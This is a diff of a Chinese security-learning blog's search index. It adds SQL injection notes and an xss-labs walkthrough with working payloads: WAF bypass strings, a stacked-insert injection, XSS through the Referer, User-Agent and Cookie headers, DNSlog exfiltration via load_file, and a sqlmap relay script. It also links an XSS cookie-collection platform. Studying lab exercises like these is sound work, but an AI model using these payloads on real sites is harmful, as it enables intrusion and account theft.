+<p>left(a,b)从左侧截取a的前b位</p>
+<p>例如：database()&#x3D;’security’  ;</p>
+<p><strong>left(database(),3)&#x3D;’sec’;</strong></p>
+<p>mid;</p>
+<p>mid(a,b,c) 从位置b开始，截取字符串a的c长度的子串</p>
+</blockquote>
+<p>长度-&gt;字符这样爆破，诶。</p>
+<h5 id="时间-延时-盲注："><a href="#时间-延时-盲注：" class="headerlink" title="时间(延时)盲注："></a>时间(延时)盲注：</h5><blockquote>
+<p>if;</p>
+<p>if(a&lt;4,”小”,”大”)；如果a的值满足&lt;4嘞，返回”小”；否则返回”大”</p>
+<p>sleep;</p>
+<p>sleep(if(length(database()&lt;8),5,0))</p>
+<p>…</p>
+</blockquote>
+<p>盲注一般写脚本、sqlmap做</p>
+<h5 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h5><blockquote>
+<p>无回显内容时，可以强制报错回显。</p>
+<p>常见的有：</p>
+<p>floor;</p>
+<p>updatexml;</p>
+<p>extractvalue;</p>
+</blockquote>
+<h5 id="使用优先度："><a href="#使用优先度：" class="headerlink" title="使用优先度："></a>使用优先度：</h5><p><strong>联合&gt;报错&gt;布尔&gt;时间</strong></p>
+<h3 id="注入技巧"><a href="#注入技巧" class="headerlink" title="注入技巧"></a>注入技巧</h3><p>类型判断+回显情况</p>
+<h2 id="d-二次、加解密、DNSlog注入等"><a href="#d-二次、加解密、DNSlog注入等" class="headerlink" title="d)二次、加解密、DNSlog注入等"></a>d)二次、加解密、DNSlog注入等</h2><h3 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h3><p>一般比如，将数据进行了加密，需要弄清楚它所采用的加密解密算法，做注入时，将输入数据同样加密后再提交</p>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>适用场景：已知代码的情况下，构造</p>
+<p>经典例子就是，注册时，允许注册admin’#这种账号，登陆进去修改admin’#的密码时其实是修改了admin（如果有的话）的密码。等于说你已知管理员账号，但不知道密码，你又可以注册又可以改密码，这种情况。</p>
+<h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h3><p>适用场景：需要有文件读取的操作权限，解决盲注不回显数据的问题。</p>
+<p>利用concat将select查询的结果与一个dnslog地址进行拼接，形成一个能够访问的域名；接着用load_file()导入或请求这个地址，在dnslog中就会有记录。</p>
+<p>可以用平台，可以用github上的dnslog.py脚本</p>
+<h3 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h3><p>适用场景：为了避免遇到加解密注入时，自己进行加密注入。以base64为例，自己写个php文件，获取该网站url，利用base64_encode函数对输入的参数x进行加密。</p>
+<p>sqlmap提供爆破参数，传递给php，php尝试获取内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url=&#x27;http://dasdadaawfwfaf/asd.asp?id=&#x27;;</span><br><span class="line">$payload=base64_encode($_GET[&#x27;x&#x27;]);</span><br><span class="line">$urls=$url.$payload;</span><br><span class="line">file_get_contents(); //在php中，字符串拼接是&quot;.&quot; //有的说，换成header()</span><br><span class="line">//echo $urls;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以该php代码放到本地环境中,如phpstudy&#x2F;www&#x2F;1.php</p>
+<p>sqlmap就可以:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/1.php?x=&quot; - v 3</span><br></pre></td></tr></table></figure>
+
+<p>sqli-labs:</p>
+<p>less 21 cookie&amp;加解密注入</p>
+<p>less24 post登陆框&amp;二次注入</p>
+<p>less 9 load_file&amp;dnslog带外注入</p>
+<h2 id="e-堆叠注入及WAF绕过"><a href="#e-堆叠注入及WAF绕过" class="headerlink" title="e)堆叠注入及WAF绕过"></a>e)堆叠注入及WAF绕过</h2><h3 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h3><p>（stacked injection），注入语句时，可以有多个语句。</p>
+<p>局限性：受到API和数据库的限制</p>
+<p><code>?id=1;insert into users(id,username,password) values(1,2,3) --+</code></p>
+<p>适用场景举例：注入需要管理员账号密码，密码是加密的，无法解密；那么堆叠注入进行插入数据，由于用户和密码是自定义的，所以可以正常解密登录</p>
+<p>sqli-labs:</p>
+<p>less 38 堆叠注入</p>
+<h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><blockquote>
+<p>WAF绕过<br>数据<br>    大小写<br>    加解密<br>    编码解码<br>    等价函数<br>    特殊符号<br>    反序列化<br>    注释符混用<br>方式<br>    提交方式更改<br>    变异<br>其他<br>    Fuzz&#x2F;模糊测试<br>    数据库特性<br>    垃圾数据溢出<br>    HTTP参数污染</p>
+</blockquote>
+<p>补充：内联注释绕过：MYSQL数据库特性 &#x2F;*!需要查询的数据*&#x2F;</p>
+<h4 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h4><p><img src="/../../../Typora/img111/image-20230524224452252.png" alt="image-20230524224452252"></p>
+<p>即有多个相同参数时，以哪个位置的参数为主。</p>
+<p>以php为例：</p>
+<blockquote>
+<?php
+
+​     \$get=  $_GET['x'];
+
+echo $get
+
+?>
+
+<p>输入参数为….?x&#x3D;12&amp;x&#x3D;7时</p>
+<p>结果显示为7</p>
+</blockquote>
+<p><strong>宝塔WAF搭建部署。</strong></p>
+<p>绕过举例：如果拦截了<strong>database()<strong>这个函数，可以用</strong>database&#x2F;</strong>&#x2F;()**；</p>
+<p>2021的安全狗联合绕过1：</p>
+<p><code>?id=-1 union%23a%0Aselect 1,2,3#</code></p>
+<blockquote>
+<p>%23a%0Ax相当于#a换行符</p>
+<p>相当于：换行执行</p>
+<p>union #a</p>
+<p>select 1,2,3#</p>
+</blockquote>
+<p>安全狗绕过2：</p>
+<p>php+apache下：</p>
+<p><code>?id=1/**&amp;id=-1 union select 1,2,3#*/</code></p>
+<p>原理相当于：&#x2F;**…*&#x2F;起注释作用，安全狗获得整段数据，匹配的是<code>1/**&amp;id=-1 union select 1,2,3#*/</code>，识别到后面是注释符时，正常情况下不执行，安全狗直接不管，但参数污染导致接收的是真实数据是<code>-1 union select 1,2,3#*/</code></p>
+<p>一般都是脚本试出来的。</p>
+<p>像这种绕过，一般要去论坛上找最新的了。</p>
+<h2 id="f-sqlmap绕过waf"><a href="#f-sqlmap绕过waf" class="headerlink" title="f)sqlmap绕过waf"></a>f)sqlmap绕过waf</h2><h1 id="2-文件上传"><a href="#2-文件上传" class="headerlink" title="2.文件上传"></a>2.文件上传</h1><h1 id="3-XSS跨站"><a href="#3-XSS跨站" class="headerlink" title="3.XSS跨站"></a>3.XSS跨站</h1><h1 id="4-文件包含"><a href="#4-文件包含" class="headerlink" title="4.文件包含"></a>4.文件包含</h1><h1 id="5-反序列化"><a href="#5-反序列化" class="headerlink" title="5.反序列化"></a>5.反序列化</h1><h1 id="6-代码执行"><a href="#6-代码执行" class="headerlink" title="6.代码执行"></a>6.代码执行</h1><h1 id="7-逻辑安全"><a href="#7-逻辑安全" class="headerlink" title="7.逻辑安全"></a>7.逻辑安全</h1><h1 id="9-未授权访问"><a href="#9-未授权访问" class="headerlink" title="9.未授权访问"></a>9.未授权访问</h1><h1 id="10-CSRF"><a href="#10-CSRF" class="headerlink" title="10.CSRF"></a>10.CSRF</h1><h1 id="11-SSRF"><a href="#11-SSRF" class="headerlink" title="11.SSRF"></a>11.SSRF</h1><h1 id="12-目录遍历"><a href="#12-目录遍历" class="headerlink" title="12.目录遍历"></a>12.目录遍历</h1><h1 id="13-文件读取"><a href="#13-文件读取" class="headerlink" title="13.文件读取"></a>13.文件读取</h1><h1 id="14-文件下载"><a href="#14-文件下载" class="headerlink" title="14.文件下载"></a>14.文件下载</h1><h1 id="15-命令执行"><a href="#15-命令执行" class="headerlink" title="15.命令执行"></a>15.命令执行</h1><h1 id="16-XXE安全"><a href="#16-XXE安全" class="headerlink" title="16.XXE安全"></a>16.XXE安全</h1>]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>waf绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xss-labs</title>
+    <url>/2023/05/17/xss-labs/</url>
+    <content><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><p>phpstudy</p>
+<h2 id="二、内容"><a href="#二、内容" class="headerlink" title="二、内容"></a>二、内容</h2><h3 id="1-level1"><a href="#1-level1" class="headerlink" title="1.level1"></a>1.level1</h3><p>url中添加</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;11&quot;)&lt;/script&gt;即可</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-level2-html实体化-lt-gt"><a href="#2-level2-html实体化-lt-gt" class="headerlink" title="2.level2(html实体化&lt;&gt;)"></a>2.level2(html实体化&lt;&gt;)</h3><p>输入level1中的值，发现&lt;&gt;被实体化了。</p>
+<p>构造input闭合</p>
+<p><code>&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
+<h3 id="3-level3-html实体化”-lt-gt"><a href="#3-level3-html实体化”-lt-gt" class="headerlink" title="3.level3(html实体化”&lt;&gt;)"></a>3.level3(html实体化”&lt;&gt;)</h3><p>经过试验单引号不会被转义</p>
+<p>构造onmouseover事件，即鼠标触碰到input标签即还行该事件</p>
+<p><code>&#39; onmouseover=javascript:alert(1) &#39;</code></p>
+<h3 id="4-level4-html实体化’-lt-gt"><a href="#4-level4-html实体化’-lt-gt" class="headerlink" title="4.level4(html实体化’&lt;&gt;)"></a>4.level4(html实体化’&lt;&gt;)</h3><p>很好，单引号、尖括号没了</p>
+<p><code>&quot; onmouseover=javascript:alert(1) &quot;</code></p>
+<h3 id="5-level5-伪协议"><a href="#5-level5-伪协议" class="headerlink" title="5.level5(伪协议)"></a>5.level5(伪协议)</h3><p>script、onmouserover等中间会加个_符号</p>
+<p>知识点：伪协议：在url中调用js方法，如Data伪协议与Javascript协议</p>
+<p><code>&quot;&gt;&lt;a href=javascript:alert(&quot;123&quot;)&gt;&quot;</code></p>
+<p>点击链接跳转即可</p>
+<p>参考：<a href="https://blog.csdn.net/qq_33181292/article/details/117251090?ops_request_misc=&request_id=&biz_id=102&utm_term=xss%E4%BC%AA%E5%8D%8F%E8%AE%AE&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-117251090.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">XSS_伪协议与编码绕过_伪协议绕过_南部余额的博客-CSDN博客</a></p>
+<p>​		<a href="https://blog.csdn.net/K_ShenH/article/details/122765092?ops_request_misc=%7B%22request_id%22:%22168440472216800197061493%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168440472216800197061493&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-122765092-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss-labs&spm=1018.2226.3001.4187">xss-labs搭建及通关攻略_Lydia_Ha的博客-CSDN博客</a></p>
+<h3 id="6-level6-小写过滤"><a href="#6-level6-小写过滤" class="headerlink" title="6.level6(小写过滤)"></a>6.level6(小写过滤)</h3><p>在script的基础上，href、src、oneerror什么的中间也加符号了</p>
+<p>但没有大写过滤</p>
+<p><code>&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code></p>
+<h3 id="7-level7-标签名过滤"><a href="#7-level7-标签名过滤" class="headerlink" title="7.level7(标签名过滤)"></a>7.level7(标签名过滤)</h3><p>src啊,&lt;&gt;script啊都被删了、on啊</p>
+<p>双写绕过</p>
+<p><code>&quot;&gt;&lt;SCRscriptIPT&gt;alert(1)&lt;/SCRscriptIPT&gt;</code></p>
+<h3 id="8-level8-unicode编码"><a href="#8-level8-unicode编码" class="headerlink" title="8.level8(unicode编码)"></a>8.level8(unicode编码)</h3><p>它把输入框的值放在了a标签的href里</p>
+<p>scr字符后面会放_符号，且大写会被转化为小写</p>
+<p>引号也实体化了</p>
+<p>将代码进行unicode编码即可</p>
+<p>如<code>javascript:alert(1)</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具 (matools.com)</a></p>
+<h3 id="level9-继续过滤"><a href="#level9-继续过滤" class="headerlink" title="level9(继续过滤)"></a>level9(继续过滤)</h3><p>还是把输入框的值放在了a标签的href里，但是unicode编码不能用咯</p>
+<p>知识点:strpos()查找字符串在另一字符串中第一次出现的位置。</p>
+<p>源码有strpos函数过滤，限制输入内容必须有http:&#x2F;&#x2F;</p>
+<p><code>javas&amp;#99;ript:alert(&#39;http://123&#39;)</code></p>
+<p>部分源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">echo &#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level10-隐藏参数"><a href="#level10-隐藏参数" class="headerlink" title="level10(隐藏参数)"></a>level10(隐藏参数)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>url被符号实体化了。</p>
+<p>从t_sort输入框下手，仅仅替换了尖括号。</p>
+<p>给input加一个onclick事件</p>
+<p>如<code>onclick=alert(1)</code></p>
+<p>记得去掉type的hide属性</p>
+<h3 id="level11-Referer"><a href="#level11-Referer" class="headerlink" title="level11(Referer)"></a>level11(Referer)</h3><p>同level10</p>
+<p>但是应该不对，怎么会有同一种解法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第四行明显是说Reffer</p>
+<p>bp时</p>
+<p><code>Referer:&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520113437383.png" alt="image-20230520113437383"></p>
+<h3 id="level12（代理）"><a href="#level12（代理）" class="headerlink" title="level12（代理）"></a>level12（代理）</h3><p>f12，看得t_ua</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;t_ua&quot; value=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>bp时，很明显是</p>
+<p><code>User-Agent:&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
+<h3 id="level13-Cookie"><a href="#level13-Cookie" class="headerlink" title="level13(Cookie)"></a>level13(Cookie)</h3><p>f12，看到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;t_cook&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这应该提示了cookie</p>
+<p>bp试试</p>
+<p><code>Cookie: user=&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
+<h3 id="level14-exif"><a href="#level14-exif" class="headerlink" title="level14(exif)"></a>level14(exif)</h3><p>待解决</p>
+<h3 id="level15-ngInclude"><a href="#level15-ngInclude" class="headerlink" title="level15(ngInclude)"></a>level15(ngInclude)</h3><p>url:</p>
+<p><code>http://localhost:81/xss-labs/level15.php?src=1.gif</code></p>
+<p>f12出现这个：</p>
+<p><img src="/../../../Typora/img111/image-20230520133632333.png" alt="image-20230520133632333"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>知识点：ng-include</p>
+<p>ng-include是angular js的东西，类似php函数中的include函数，即包含文件。</p>
+<p>1、ng-include 指令用于包含外部的 HTML文件。</p>
+<p>2、包含的内容将作为指定元素的子节点。</p>
+<p>3、ng-include 属性的值可以是一个表达式，返回一个文件名。</p>
+<p>4、默认情况下，包含的文件需要包含在同一个域名下。</p>
+<p>值得注意的是：</p>
+<p>ng-include,如果单纯指定地址，必须要加引号</p>
+<p>ng-include,加载外部html，script标签中的内容不执行</p>
+<p>ng-include,加载外部html中含有style标签样式可以识别<br>参考：<a href="https://blog.csdn.net/RuoLi_s/article/details/112690177?ops_request_misc=&request_id=&biz_id=102&utm_term=xss-labs%E9%80%9A%E5%85%B3&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-112690177.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187">xss-labs通关挑战（xss challenge）_RuoLi_s的博客-CSDN博客</a></p>
+<p>把其他存在xss漏洞的文件包含进来。</p>
+<p><code>src=&#39;level1.php?name=&lt;a href=javascript:alert(1)&gt;&#39;</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520135939252.png" alt="image-20230520135939252"></p>
+<h3 id="level16-空格绕过"><a href="#level16-空格绕过" class="headerlink" title="level16(空格绕过)"></a>level16(空格绕过)</h3><p>源代码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>主要是script替换了，空格实体化了，”&#x2F;“也没了</p>
+<p>试试img，并且替换个空格</p>
+<p>%0a试试。</p>
+<p><code>keyword=</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520142552842.png" alt="image-20230520142552842"></p>
+<h3 id="level17-18-参数拼接"><a href="#level17-18-参数拼接" class="headerlink" title="level17-18(参数拼接)"></a>level17-18(参数拼接)</h3><p>url两个参数，中间有&#x3D;</p>
+<p><code>arg01=%20onmouseover&amp;arg02=alert(1)</code></p>
+<p>onmouseover前加个空格</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520154125903.png" alt="image-20230520154125903"></p>
+<p>level18同理。</p>
+<h3 id="level19-20-Flash反编译"><a href="#level19-20-Flash反编译" class="headerlink" title="level19-20(Flash反编译)"></a>level19-20(Flash反编译)</h3><p>待解决</p>
+]]></content>
+      <categories>
+        <category>xss</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>xss</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>在线网址</title>
     <url>/2023/05/13/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/</url>
     <content><![CDATA[<h2 id="一、在线工具"><a href="#一、在线工具" class="headerlink" title="一、在线工具"></a>一、在线工具</h2><p><a href="https://c.runoob.com/compile/1/">PHP 在线工具 | 菜鸟工具 (runoob.com)</a></p>
 <p><a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64 编码&#x2F;解码 - 在线工具 (toolhelper.cn)</a></p>
 <p><a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
 <p><a href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具 (matools.com)</a></p>
-<h2 id="二、学习网址"><a href="#二、学习网址" class="headerlink" title="二、学习网址"></a>二、学习网址</h2><p>[Nessus安装与使用_nessus安装使用教程_@Camelus的博客-CSDN博客](<a href="https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&request_id=&biz_id=102&utm_term=windows">https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=windows</a> nessus安装&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-1-126803631.142^v87^control_2,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<h2 id="二、学习网址"><a href="#二、学习网址" class="headerlink" title="二、学习网址"></a>二、学习网址</h2><p><a href="https://www.freebuf.com/column/195521.html">https://www.freebuf.com/column/195521.html</a></p>
+<p><a href="http://xiaodi8.com/?id=25">http://xiaodi8.com/?id=25</a></p>
+<p><a href="https://xz.aliyun.com/t/6103">https://xz.aliyun.com/t/6103</a></p>
+<p><a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></p>
+<p>[Nessus安装与使用_nessus安装使用教程_@Camelus的博客-CSDN博客](<a href="https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&request_id=&biz_id=102&utm_term=windows">https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=windows</a> nessus安装&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-1-126803631.142^v87^control_2,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
 <p><a href="https://bbs.zkaq.cn/">Track 安全社区 — 掌控安全在线教育- Track 知识社区 - 掌控安全在线教育 - Powered by 掌控者 (zkaq.cn)</a></p>
 <p><a href="https://overthewire.org/wargames/natas/natas9.html">OverTheWire: Natas Level 8 → Level 9</a></p>
 <p><a href="https://www.52pojie.cn/forum.php">吾爱破解 - LCG - LSG|安卓破解|病毒分析|www.52pojie.cn</a></p>
 <p><a href="https://blog.csdn.net/weixin_44211968/article/details/124696627?ops_request_misc=%7B%22request_id%22:%22168441788816800211527620%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168441788816800211527620&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124696627-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7&spm=1018.2226.3001.4187">【Web 安全】XSS 攻击详解_xss攻击_想变厉害的大白菜的博客-CSDN博客</a></p>
+<p>乌云社区</p>
+<p>先知社区</p>
+<h2 id="三、学习平台"><a href="#三、学习平台" class="headerlink" title="三、学习平台"></a>三、学习平台</h2><p>xss接收凭条:<a href="https://xss.pt/xss.php">https://xss.pt/xss.php</a></p>
+<p>dnslog平台:<a href="http://ceye.io/">http://ceye.io/</a></p>
 ]]></content>
       <categories>
         <category>在线工具</category>
@@ -648,7 +1096,7 @@ return $outText;#新值
 <p>xss平台搭建参照：<a href="https://www.cnblogs.com/Cl0ud/p/12176961.html">搭建xss-platform平台 - 春告鳥 - 博客园 (cnblogs.com)</a></p>
 <p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520205909377-1684589650280-1.png"></p>
 <p>再生成payload进行注入即可。</p>
-<p>但是我的平台没收到。</p>
+<p>但是我的平台没收到。（噗，我搭建的是）</p>
 <p>尝试用dvwa的xss漏洞时，都可以收到，但是封神台上失败。</p>
 ]]></content>
       <categories>
@@ -659,6 +1107,11 @@ return $outText;#新值
         <tag>靶场</tag>
         <tag>渗透测试</tag>
       </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/05/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%BC%E8%BF%B0/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>渗透工具</title>
@@ -727,6 +1180,130 @@ return $outText;#新值
         <tag>nmap</tag>
         <tag>cs</tag>
         <tag>Nessus</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>渗透测试</title>
+    <url>/2023/05/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<h2 id="一、基本流程"><a href="#一、基本流程" class="headerlink" title="一、基本流程"></a>一、基本流程</h2><p>目标确认-&gt;信息收集-&gt;漏洞发现-&gt;漏洞利用-&gt;权限维持、内网渗透-&gt;目标获取、痕迹清理</p>
+<h3 id="1、目标确认"><a href="#1、目标确认" class="headerlink" title="1、目标确认"></a>1、目标确认</h3><p>要获取到什么权限</p>
+<h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h3><p>域名、IP、端口、服务端框架、语言、开源情报、防御措施等</p>
